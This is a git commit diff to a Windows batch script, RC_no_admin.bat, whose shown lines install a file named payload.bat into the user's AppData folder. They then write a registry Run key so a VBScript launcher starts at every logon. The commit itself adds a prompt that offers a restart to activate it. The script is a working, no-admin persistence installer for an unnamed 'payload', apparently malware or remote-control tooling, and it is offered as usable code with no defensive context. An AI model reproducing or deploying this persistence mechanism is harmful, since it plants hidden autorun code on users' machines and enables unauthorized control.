b3ab0e30fab81eb35f4e211bee4038f28f04bf0a
Guest257351 <lukenicholls510@gmail.com>
2021-04-08 09:33:48 +0930

    updated run code

--- RC_no_admin.bat
+++ RC_no_admin.bat
@@ -5,5 +5,8 @@ copy "payload\payload.bat"  "C:\users\%username%\AppData" >nul
 if exist "C:\users\%username%\AppData\payload.bat" (echo [92msuccessfuly moved payload.bat[0m) else (echo [31mfailed to move payload.bat[0m)
 REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v payload /t REG_SZ /d "WScript C:\users\%username%\launch.vbs"
 echo [92msuccessfuly modified HKCU registry[0m
+echo would you like to restart for the changes to take effect?
+choice 
+if %errorlevel% equ 1 shutdown /g
 pause >nul
 exit
